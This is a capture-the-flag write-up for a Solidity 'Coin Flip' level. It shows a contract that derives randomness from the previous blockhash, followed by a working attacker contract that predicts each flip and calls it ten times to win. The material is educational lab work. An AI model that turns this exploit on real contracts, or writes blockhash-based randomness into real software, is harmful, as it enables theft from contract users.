# 03 Coin Flip


```
This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To 
complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

```

#### Start 


### (1) `Make consecutiveWins = 10`


Looking at the code, you can see that the value consecutiveWins can be incremented when the `if (side == _guess)` condition

We can see that the code is calculating the side. From here we can write another contract to calculate the correct side and then call the fucntion flip with the correct side

```
 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 uint256 blockValue = uint256(blockhash(block.number - 1));
 lastHash = blockValue;
 uint256 coinFlip = blockValue / FACTOR;
 bool side = coinFlip == 1 ? true : false;

```

You can no longer use Open Developer Tools (F12) alone. I suggest you use remix to write code and deploy contracts

#### This is the code I used to attack the CoinFlip contract
```

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;


    interface CoinFlip {
        function flip(bool _guess) external returns (bool);
        function consecutiveWins() external view returns(uint256);
    }

    contract Hack {

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        function _getSide() private view returns(bool){
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            return side;
        }
            
        

        function exploitCoinFlip(address _targetExploit) external {
                require( CoinFlip(_targetExploit).flip(_getSide()) == true,"false");
        }

        function getConsecutiveWins (address _targetExploit) view external returns (uint256) {
            return  CoinFlip(_targetExploit).consecutiveWins();
        }

    }

```
- `function _getSide() private view returns(bool)`

    This function to calculate the correct side and called by function `exploitCoinFlip`

- `function exploitCoinFlip(address _targetExploit) external`

    This function call function `flip` in the target CoinFlip contract to increment the value `consecutiveWins`

- `function getConsecutiveWins (address _targetExploit) view external returns (uint256)`

    This function just check the value `consecutiveWins` how much is it now

Use the remix deploy contract `Hack`  then call the function `exploitCoinFlip(address _targetExploit)` 10 times

Click button Submit instance and confirm transaction

# !!! we passed !!!


